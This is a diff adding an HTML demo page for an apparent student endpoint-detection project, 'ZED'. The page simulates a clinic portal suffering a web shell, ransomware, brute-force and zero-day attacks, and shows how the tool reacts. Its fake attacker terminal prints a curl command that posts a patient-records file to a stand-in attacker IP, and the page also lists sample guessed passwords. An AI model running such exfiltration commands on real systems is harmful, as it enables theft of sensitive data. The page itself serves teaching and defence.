@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apex Medical Clinic - Patient & Staff Portal (ZED Victim Demo)</title>
+  <style>
+    :root {
+      --primary: #006699;
+      --primary-dark: #004d73;
+      --secondary: #e6f2f8;
+      --accent: #00a86b;
+      --danger: #d9381e;
+      --warning: #f59e0b;
+      --dark: #1e293b;
+      --light: #f8fafc;
+      --card-bg: #ffffff;
+      --border: #cbd5e1;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f1f5f9;
+      color: var(--dark);
+      padding-top: 75px; /* Room for demonstration control bar */
+      min-height: 100vh;
+    }
+
+    /* Demonstration Control Bar (Floating at Top) */
+    .demo-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #0f172a;
+      color: #fff;
+      padding: 10px 20px;
+      z-index: 1000;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      border-bottom: 2px solid var(--primary);
+    }
+    .demo-title {
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      color: #38bdf8;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .demo-actions {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .btn-attack {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #f8fafc;
+      padding: 6px 12px;
+      font-size: 12px;
+      font-weight: 600;
+      border-radius: 4px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s ease;
+    }
+    .btn-attack:hover {
+      background: #334155;
+      border-color: #38bdf8;
+    }
+    .btn-attack.danger {
+      border-color: #ef4444;
+      color: #fca5a5;
+    }
+    .btn-attack.danger:hover {
+      background: #ef4444;
+      color: #fff;
+    }
+    .btn-attack.amber {
+      border-color: #f59e0b;
+      color: #fcd34d;
+    }
+    .btn-attack.amber:hover {
+      background: #f59e0b;
+      color: #000;
+    }
+    .btn-attack.guide {
+      background: #0284c7;
+      border-color: #38bdf8;
+      color: #fff;
+    }
+    .btn-attack.guide:hover {
+      background: #0369a1;
+    }
+    .btn-attack.reset {
+      background: #10b981;
+      border-color: #34d399;
+      color: #fff;
+    }
+    .btn-attack.reset:hover {
+      background: #059669;
+    }
+
+    /* Main Clinic Website Layout */
+    .clinic-header {
+      background: #fff;
+      border-bottom: 1px solid var(--border);
+      padding: 16px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+    .clinic-brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .clinic-logo {
+      width: 40px;
+      height: 40px;
+      background: var(--primary);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 22px;
+      font-weight: bold;
+    }
+    .clinic-name {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--primary);
+    }
+    .clinic-tagline {
+      font-size: 11px;
+      color: #64748b;
+    }
+    .clinic-status-pill {
+      background: #ecfdf5;
+      color: #059669;
+      border: 1px solid #a7f3d0;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .clinic-status-pill.compromised {
+      background: #fef2f2;
+      color: #dc2626;
+      border-color: #fecaca;
+      animation: pulse 1s infinite alternate;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 24px auto;
+      padding: 0 20px;
+    }
+
+    /* Alert Banner on Website */
+    .impact-banner {
+      display: none;
+      padding: 14px 20px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .impact-banner.active {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .impact-banner.red {
+      background: #fee2e2;
+      color: #991b1b;
+      border: 1px solid #f87171;
+    }
+    .impact-banner.amber {
+      background: #fef3c7;
+      color: #92400e;
+      border: 1px solid #fcd34d;
+    }
+    .impact-banner.green {
+      background: #d1fae5;
+      color: #065f46;
+      border: 1px solid #6ee7b7;
+    }
+
+    /* Grid */
+    .grid-layout {
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 20px;
+    }
+    @media (max-width: 900px) {
+      .grid-layout { grid-template-columns: 1fr; }
+    }
+
+    /* Cards */
+    .card {
+      background: #fff;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      margin-bottom: 20px;
+    }
+    .card-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #1e293b;
+      margin-bottom: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #f1f5f9;
+      padding-bottom: 8px;
+    }
+
+    /* Patient Table */
+    .table-container {
+      overflow-x: auto;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+    th, td {
+      padding: 10px 12px;
+      text-align: left;
+      border-bottom: 1px solid #e2e8f0;
+    }
+    th {
+      background: #f8fafc;
+      color: #475569;
+      font-weight: 600;
+    }
+    tr:hover {
+      background: #f8fafc;
+    }
+    .file-tag {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 11.5px;
+      font-family: monospace;
+      font-weight: 600;
+      background: #e0f2fe;
+      color: #0369a1;
+    }
+    .file-tag.locked {
+      background: #fee2e2;
+      color: #b91c1c;
+      border: 1px solid #f87171;
+    }
+
+    /* Forms */
+    .form-group {
+      margin-bottom: 14px;
+    }
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #475569;
+      margin-bottom: 5px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 8px 12px;
+      border: 1px solid #cbd5e1;
+      border-radius: 4px;
+      font-size: 13px;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(0, 102, 153, 0.2);
+    }
+    .btn-submit {
+      width: 100%;
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 9px;
+      font-size: 13px;
+      font-weight: 600;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn-submit:hover {
+      background: var(--primary-dark);
+    }
+
+    /* Upload Box */
+    .upload-box {
+      border: 2px dashed #cbd5e1;
+      border-radius: 6px;
+      padding: 24px;
+      text-align: center;
+      background: #f8fafc;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .upload-box:hover {
+      border-color: var(--primary);
+      background: #f0f9ff;
+    }
+    .upload-icon {
+      font-size: 28px;
+      color: #0284c7;
+      margin-bottom: 6px;
+    }
+
+    /* Attacker Backdoor Terminal Modal / Popup */
+    .hacker-window {
+      display: none;
+      margin-top: 15px;
+      background: #090d09;
+      border: 1px solid #22c55e;
+      border-radius: 6px;
+      padding: 12px;
+      color: #22c55e;
+      font-family: monospace;
+      font-size: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+    }
+    .hacker-header {
+      border-bottom: 1px solid #15803d;
+      padding-bottom: 4px;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #86efac;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* Comparison Box for Zero-Day */
+    .comparison-box {
+      display: none;
+      margin-top: 15px;
+      background: #0f172a;
+      border-radius: 6px;
+      padding: 16px;
+      color: #fff;
+    }
+    .comparison-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 10px;
+    }
+    .comp-col {
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 12.5px;
+      line-height: 1.45;
+    }
+    .comp-av {
+      background: #334155;
+      border-left: 4px solid #ef4444;
+    }
+    .comp-zed {
+      background: #1e293b;
+      border-left: 4px solid #10b981;
+    }
+
+    /* Teacher Limitations Modal */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .modal-content {
+      background: #fff;
+      max-width: 850px;
+      width: 100%;
+      border-radius: 8px;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      position: relative;
+    }
+    .modal-header {
+      background: #0f172a;
+      color: #fff;
+      padding: 16px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top-left-radius: 8px;
+      border-top-right-radius: 8px;
+    }
+    .modal-body {
+      padding: 24px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+    .limit-card {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-left: 4px solid var(--primary);
+      border-radius: 4px;
+      padding: 14px 16px;
+      margin-bottom: 16px;
+    }
+    .limit-card.warn {
+      border-left-color: #f59e0b;
+    }
+    .limit-card.crit {
+      border-left-color: #ef4444;
+    }
+    .limit-title {
+      font-weight: 700;
+      font-size: 14.5px;
+      margin-bottom: 4px;
+      color: #0f172a;
+    }
+    .limit-plain {
+      font-size: 13px;
+      color: #475569;
+    }
+    .btn-close {
+      background: transparent;
+      border: none;
+      color: #94a3b8;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .btn-close:hover {
+      color: #fff;
+    }
+
+    @keyframes pulse {
+      from { opacity: 0.7; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- TOP HUD: Interactive Demonstration Control Bar -->
+  <div class="demo-bar">
+    <div class="demo-title">
+      <span>🎯 TARGET WEBSITE SIMULATOR</span>
+      <span style="font-size: 11px; color: #94a3b8;">(Click an attack to see how a real website breaks & how ZED responds)</span>
+    </div>
+    <div class="demo-actions">
+      <button class="btn-attack danger" onclick="demoWebShell()">💣 1. Web Shell Exploit</button>
+      <button class="btn-attack danger" onclick="demoRansomware()">🔒 2. Ransomware Attack</button>
+      <button class="btn-attack amber" onclick="demoBruteForce()">🔑 3. Brute Force Login</button>
+      <button class="btn-attack amber" onclick="demoZeroDay()">⚡ 4. Stealth Zero-Day</button>
+      <button class="btn-attack reset" onclick="resetWebsite()">🔄 Reset Portal</button>
+      <button class="btn-attack guide" onclick="openLimitationsModal()">📖 Explainer &amp; Limitations</button>
+    </div>
+  </div>
+
+  <!-- CLINIC WEBSITE HEADER -->
+  <header class="clinic-header">
+    <div class="clinic-brand">
+      <div class="clinic-logo">+</div>
+      <div>
+        <div class="clinic-name">Apex Community Health Clinic</div>
+        <div class="clinic-tagline">Integrated Patient Telemetry &amp; Electronic Health Records</div>
+      </div>
+    </div>
+    <div style="display: flex; gap: 15px; align-items: center;">
+      <a href="/" target="_blank" style="font-size: 12px; color: #0284c7; text-decoration: none; font-weight: 600;">[ Open ZED Terminal Feed ↗ ]</a>
+      <div class="clinic-status-pill" id="serverStatusPill">
+        <span>●</span> <span id="serverStatusText">System Status: Online &amp; Secure</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN CONTAINER -->
+  <main class="container">
+
+    <!-- Active Attack / Defense Impact Banner -->
+    <div class="impact-banner" id="impactBanner">
+      <div id="impactBannerMsg">Notice message</div>
+      <button onclick="dismissBanner()" style="background:transparent; border:none; cursor:pointer; font-weight:bold;">✕</button>
+    </div>
+
+    <!-- Hacker Backdoor Terminal (Visual for Non-Tech Users) -->
+    <div class="hacker-window" id="hackerTerminal">
+      <div class="hacker-header">
+        <span>&gt; ATTACKER BACKDOOR SHELL (/bin/bash)</span>
+        <span id="hackerStatus" style="color: #ef4444;">[ACTIVE C2 CONNECTION]</span>
+      </div>
+      <div id="hackerOutput">
+        $ whoami<br>
+        www-data<br>
+        $ cat /var/www/patient_records.csv | head -n 3<br>
+        101, Alice Smith, Cardiac Arrhythmia, O+<br>
+        102, Bob Jones, Type-2 Diabetes, A+<br>
+        $ curl -X POST -d @patient_records.csv http://198.51.100.42:8443/exfil<br>
+        [+] 50 patient medical records exfiltrated to attacker remote server!
+      </div>
+    </div>
+
+    <!-- Side-by-side Zero-Day Comparison Box -->
+    <div class="comparison-box" id="zeroDayComparison">
+      <div style="font-size: 14px; font-weight: bold; color: #38bdf8;">
+        🔬 EXPERIMENT RESULT: WHY TRADITIONAL ANTIVIRUS FAILS VS WHY ZED ML SUCCEEDS
+      </div>
+      <div class="comparison-grid">
+        <div class="comp-col comp-av">
+          <strong style="color: #fca5a5;">❌ Traditional Antivirus (Signature Matching):</strong><br>
+          • <strong>Verdict:</strong> <span style="background: #991b1b; padding: 2px 6px; border-radius: 3px;">CLEAN / PASSED</span><br>
+          • <strong>Reason:</strong> The attack used an unknown zero-day technique. Because no virus signature or hash exists in the database, signature scanners detected 0 threats.
+        </div>
+        <div class="comp-col comp-zed">
+          <strong style="color: #86efac;">✅ ZED Machine Learning (Isolation Forest):</strong><br>
+          • <strong>Verdict:</strong> <span style="background: #065f46; padding: 2px 6px; border-radius: 3px;">ANOMALY DETECTED (Score: -0.24)</span><br>
+          • <strong>Reason:</strong> ZED does not check signatures. It observed abnormal process velocity and socket entropy. Unsupervised ML flagged it as statistically abnormal!
+        </div>
+      </div>
+    </div>
+
+    <!-- Website Body Grid -->
+    <div class="grid-layout" style="margin-top: 20px;">
+
+      <!-- Left Column: Patient Records Table -->
+      <div>
+        <div class="card">
+          <div class="card-title">
+            <span>📋 Confidential Patient Directory</span>
+            <span style="font-size: 12px; color: #64748b; font-weight: normal;">4 Active In-Patients</span>
+          </div>
+          <div class="table-container">
+            <table>
+              <thead>
+                <tr>
+                  <th>Patient ID</th>
+                  <th>Full Name</th>
+                  <th>Condition</th>
+                  <th>Blood</th>
+                  <th>Medical Record File</th>
+                </tr>
+              </thead>
+              <tbody id="patientTableBody">
+                <tr>
+                  <td>#MED-101</td>
+                  <td><strong>Alice Smith</strong></td>
+                  <td>Cardiology Checkup</td>
+                  <td>O+</td>
+                  <td><span class="file-tag" id="fileTag1">alice_cardio_scan.pdf</span></td>
+                </tr>
+                <tr>
+                  <td>#MED-102</td>
+                  <td><strong>Robert Jones</strong></td>
+                  <td>Post-Op Recovery</td>
+                  <td>A+</td>
+                  <td><span class="file-tag" id="fileTag2">jones_surgical_chart.dat</span></td>
+                </tr>
+                <tr>
+                  <td>#MED-103</td>
+                  <td><strong>Carolyn Davis</strong></td>
+                  <td>Neurology Observation</td>
+                  <td>B-</td>
+                  <td><span class="file-tag" id="fileTag3">davis_eeg_telemetry.bin</span></td>
+                </tr>
+                <tr>
+                  <td>#MED-104</td>
+                  <td><strong>David Miller</strong></td>
+                  <td>Orthopedic Follow-up</td>
+                  <td>AB+</td>
+                  <td><span class="file-tag" id="fileTag4">miller_xray_lumbar.dcm</span></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- System Architecture Explanation Card (For Non-Tech Observers) -->
+        <div class="card">
+          <div class="card-title">
+            <span>💡 How Non-Technical People Can Understand This</span>
+          </div>
+          <p style="font-size: 13px; color: #475569; line-height: 1.6;">
+            Think of this website as a busy hospital building:
+            <br>
+            • <strong>The Front Door:</strong> Patients and doctors submit forms and upload lab files.
+            <br>
+            • <strong>The Attacker:</strong> A criminal disguises an explosive or a hidden camera as a medical report (Web Shell or Ransomware).
+            <br>
+            • <strong>Traditional Security:</strong> Guards checking IDs at the door against a list of known criminals. If the attacker has a brand new disguise (a Zero-Day), the guards let them straight through.
+            <br>
+            • <strong>ZED EDR Defense:</strong> Motion sensors, hallway cameras, and AI security watching what people do <em>inside</em> the building. When someone suddenly starts breaking file cabinets or sneaking into the basement, ZED steps in and terminates the rogue process.
+          </p>
+        </div>
+      </div>
+
+      <!-- Right Column: Upload Box & Staff Login -->
+      <div>
+        <!-- Upload Box (The Vulnerable Entry Point) -->
+        <div class="card">
+          <div class="card-title">
+            <span>📤 Upload Lab Results</span>
+            <span style="font-size: 11px; color: #e11d48; font-weight: 600;">[VULNERABLE SINK]</span>
+          </div>
+          <p style="font-size: 12px; color: #64748b; margin-bottom: 12px;">
+            Physicians upload diagnostic lab charts (.pdf, .png). Unrestricted uploads allow hostile web shell scripts.
+          </p>
+          <div class="upload-box" onclick="demoWebShell()">
+            <div class="upload-icon">📄</div>
+            <strong style="font-size: 13px; color: #0f172a;">Drag lab scan here, or click to upload</strong>
+            <p style="font-size: 11px; color: #64748b; margin-top: 4px;">(Clicking simulates malicious file upload)</p>
+          </div>
+        </div>
+
+        <!-- Staff Login Card (The Brute Force Sink) -->
+        <div class="card">
+          <div class="card-title">
+            <span>🔐 Staff Portal Authentication</span>
+          </div>
+          <form onsubmit="event.preventDefault(); demoBruteForce();">
+            <div class="form-group">
+              <label>Doctor / Staff Username</label>
+              <input type="text" id="loginUser" value="dr_smith" readonly>
+            </div>
+            <div class="form-group">
+              <label>Passcode</label>
+              <input type="password" id="loginPass" value="••••••••••••" readonly>
+            </div>
+            <button type="submit" class="btn-submit" id="loginBtn">Simulate Staff Login</button>
+          </form>
+          <div id="loginFeedback" style="display: none; margin-top: 10px; font-size: 11.5px; padding: 6px 10px; border-radius: 4px;"></div>
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- TEACHER / NON-TECH LIMITATIONS MODAL -->
+  <div class="modal-overlay" id="limitationsModal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3 style="font-size: 16px;">📚 ZED Project Limitations &amp; Architecture (Non-Tech Guide)</h3>
+        <button class="btn-close" onclick="closeLimitationsModal()">✕</button>
+      </div>
+      <div class="modal-body">
+        <p style="margin-bottom: 16px; color: #334155;">
+          Every real-world cybersecurity project has boundaries. Being honest about system limitations is what earns high marks in academic evaluations and project vivas. Here are ZED's 4 core limitations explained in plain English:
+        </p>
+
+        <!-- Limitation 1 -->
+        <div class="limit-card">
+          <div class="limit-title">1. Post-Exploitation Detection (Not Vulnerability Prevention)</div>
+          <div class="limit-plain">
+            <strong>Analogy:</strong> A smoke detector in a hallway.<br>
+            <strong>Explanation:</strong> ZED does not stop a hacker from finding a bug in website code (like poor input sanitization or outdated Apache versions). Instead, ZED detects what happens <em>after</em> the hacker breaks in (e.g., launching hidden command shells, modifying cron files, or encrypting files).<br>
+            <strong>Limitation:</strong> The initial exploit still succeeds momentarily before ZED observes the behavior and kills the process.
+          </div>
+        </div>
+
+        <!-- Limitation 2 -->
+        <div class="limit-card warn">
+          <div class="limit-title">2. The "Low &amp; Slow" Stealth Attacker</div>
+          <div class="limit-plain">
+            <strong>Analogy:</strong> A thief walking at normal speed carrying one notebook every two hours.<br>
+            <strong>Explanation:</strong> ZED's Machine Learning and Rule engines look for unusual velocity spikes (e.g. 15 files modified in 2 seconds, 10 failed logins in 5 seconds).<br>
+            <strong>Limitation:</strong> If a highly skilled, patient attacker executes actions very slowly over several days and uses standard administrative commands ("Living off the Land"), they may blend into normal background noise.
+          </div>
+        </div>
+
+        <!-- Limitation 3 -->
+        <div class="limit-card crit">
+          <div class="limit-title">3. User-Space vs. Kernel-Space Architecture</div>
+          <div class="limit-plain">
+            <strong>Analogy:</strong> A security guard standing in the lobby vs. a guard who built the building's foundation.<br>
+            <strong>Explanation:</strong> Multi-million dollar commercial tools (like CrowdStrike Falcon) install deep inside the operating system kernel (Ring 0 / eBPF). ZED runs in user-space using standard Python libraries (<code>psutil</code>, <code>watchdog</code>).<br>
+            <strong>Limitation:</strong> If an attacker gains full <code>root</code> / superuser privileges on the machine, they could theoretically issue a <code>kill -9</code> against ZED's Python process. Hardening the agent against root tampering is outside the scope of this project.
+          </div>
+        </div>
+
+        <!-- Limitation 4 -->
+        <div class="limit-card warn">
+          <div class="limit-title">4. Machine Learning False Positives &amp; Training Quality</div>
+          <div class="limit-plain">
+            <strong>Analogy:</strong> A guard dog trained only in a quiet room barking when a busy delivery truck arrives.<br>
+            <strong>Explanation:</strong> ZED's Isolation Forest model learns what "normal" looks like from baseline activity on the machine.<br>
+            <strong>Limitation:</strong> If baseline training occurred while the machine was idle, then a legitimate heavy user task (like running a big software build or copying 5,000 family photos) could deviate from the baseline and trigger a false alarm.
+          </div>
+        </div>
+
+        <div style="background: #e0f2fe; padding: 12px 16px; border-radius: 4px; font-size: 13px; color: #0369a1;">
+          <strong>💡 Presentation Tip for Your Teacher:</strong> "ZED is designed specifically as a lightweight, 8 GB RAM-friendly, behavior-based EDR that pairs rules with unsupervised machine learning to catch novel zero-day patterns without requiring GPU hardware or expensive cloud licenses."
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Show Banner Helper
+    function showBanner(type, message) {
+      const banner = document.getElementById('impactBanner');
+      const bannerMsg = document.getElementById('impactBannerMsg');
+      banner.className = `impact-banner active ${type}`;
+      bannerMsg.innerHTML = message;
+    }
+
+    function dismissBanner() {
+      document.getElementById('impactBanner').className = 'impact-banner';
+    }
+
+    // Modal Control
+    function openLimitationsModal() {
+      document.getElementById('limitationsModal').style.display = 'flex';
+    }
+    function closeLimitationsModal() {
+      document.getElementById('limitationsModal').style.display = 'none';
+    }
+
+    // Reset Website State
+    function resetWebsite() {
+      document.getElementById('hackerTerminal').style.display = 'none';
+      document.getElementById('zeroDayComparison').style.display = 'none';
+      document.getElementById('serverStatusPill').className = 'clinic-status-pill';
+      document.getElementById('serverStatusText').innerText = 'System Status: Online & Secure';
+
+      // Restore patient files
+      document.getElementById('fileTag1').className = 'file-tag';
+      document.getElementById('fileTag1').innerText = 'alice_cardio_scan.pdf';
+      document.getElementById('fileTag2').className = 'file-tag';
+      document.getElementById('fileTag2').innerText = 'jones_surgical_chart.dat';
+      document.getElementById('fileTag3').className = 'file-tag';
+      document.getElementById('fileTag3').innerText = 'davis_eeg_telemetry.bin';
+      document.getElementById('fileTag4').className = 'file-tag';
+      document.getElementById('fileTag4').innerText = 'miller_xray_lumbar.dcm';
+
+      const fb = document.getElementById('loginFeedback');
+      fb.style.display = 'none';
+
+      showBanner('green', '<strong>[PORTAL RESTORED]:</strong> All simulated attacks stopped. Clinic database and files restored to safe state.');
+    }
+
+    // Demo Scenario 1: Web Shell Exploit
+    async function demoWebShell() {
+      showBanner('amber', '<strong>[EXPLOIT STAGE 1]:</strong> Simulating attacker uploading malicious file <code>lab_scan.pdf.sh</code>...');
+      
+      // Notify ZED server
+      fetch('/api/v1/attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ scenario: 1 })
+      });
+
+      setTimeout(() => {
+        document.getElementById('serverStatusPill').className = 'clinic-status-pill compromised';
+        document.getElementById('serverStatusText').innerText = 'STATUS: UNDER ACTIVE ATTACK';
+        document.getElementById('hackerTerminal').style.display = 'block';
+        document.getElementById('hackerStatus').innerText = '[ACTIVE SHELL - DUMPING DATA]';
+        document.getElementById('hackerStatus').style.color = '#ef4444';
+        showBanner('red', '<strong>[ALARM]:</strong> Web application exploited! Web server spawned an unauthorized command shell (/bin/bash).');
+      }, 700);
+
+      // ZED Automated Response Intervention
+      setTimeout(() => {
+        document.getElementById('hackerStatus').innerText = '[KILLED BY ZED EDR RESPONSE]';
+        document.getElementById('hackerStatus').style.color = '#22c55e';
+        showBanner('green', '<strong>[ZED RESPONSE SUCCESS]:</strong> EDR Rule T1059.004 tripped! Hostile <code>/bin/bash</code> process terminated instantly. Attacker connection severed.');
+      }, 2400);
+    }
+
+    // Demo Scenario 2: Ransomware Infection
+    async function demoRansomware() {
+      showBanner('red', '<strong>[RANSOMWARE TRIGGERED]:</strong> Malicious encryption script executed on hospital file server!');
+      
+      fetch('/api/v1/attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ scenario: 3 })
+      });
+
+      // Rapidly rename patient records to .locked
+      const files = ['fileTag1', 'fileTag2', 'fileTag3', 'fileTag4'];
+      files.forEach((id, idx) => {
+        setTimeout(() => {
+          const el = document.getElementById(id);
+          el.className = 'file-tag locked';
+          el.innerText = el.innerText.split('.')[0] + '.locked 🔒';
+        }, (idx + 1) * 300);
+      });
+
+      setTimeout(() => {
+        showBanner('green', '<strong>[ZED EDR INTERVENTION]:</strong> Mass file encryption velocity detected (>8 files in 3s, MITRE T1486). Encryptor process terminated. Hospital records protected from further damage!');
+      }, 1800);
+    }
+
+    // Demo Scenario 3: Brute Force Login
+    async function demoBruteForce() {
+      const fb = document.getElementById('loginFeedback');
+      fb.style.display = 'block';
+      fb.style.background = '#fef3c7';
+      fb.style.color = '#92400e';
+      fb.innerHTML = '<strong>[BOT ATTACK RUNNING]:</strong> Automated dictionary bot attempting 8 rapid logins...';
+
+      fetch('/api/v1/attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ scenario: 5 })
+      });
+
+      const passwords = ['123456', 'clinic2024', 'password', 'dr_smith1', 'admin', 'welcome1'];
+      passwords.forEach((pwd, idx) => {
+        setTimeout(() => {
+          document.getElementById('loginPass').value = pwd;
+          fb.innerHTML = `Attempt ${idx + 1}/${passwords.length}: Failed login with '${pwd}'...`;
+        }, (idx + 1) * 200);
+      });
+
+      setTimeout(() => {
+        fb.style.background = '#fee2e2';
+        fb.style.color = '#991b1b';
+        fb.innerHTML = '<strong>[IP QUARANTINED]:</strong> ZED Rule T1110.001 caught high-frequency authentication failures. Attacker IP blocked by iptables firewall!';
+        showBanner('amber', '<strong>[BRUTE FORCE BLOCKED]:</strong> Authentication threshold exceeded. Attacker IP dropped.');
+      }, 1600);
+    }
+
+    // Demo Scenario 4: Stealth Zero-Day
+    async function demoZeroDay() {
+      showBanner('amber', '<strong>[TESTING ZERO-DAY]:</strong> Executing novel multi-vector post-exploitation attack designed to evade all static signatures...');
+      document.getElementById('zeroDayComparison').style.display = 'block';
+
+      fetch('/api/v1/attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ scenario: 6 })
+      });
+
+      setTimeout(() => {
+        showBanner('green', '<strong>[ZERO-DAY CAUGHT BY ML]:</strong> Traditional rules missed it (0 signatures). Isolation Forest ML detected anomalous behavioral deviations (-0.24 score) and raised high-priority alert!');
+      }, 1200);
+    }
+  </script>
+</body>
+</html>
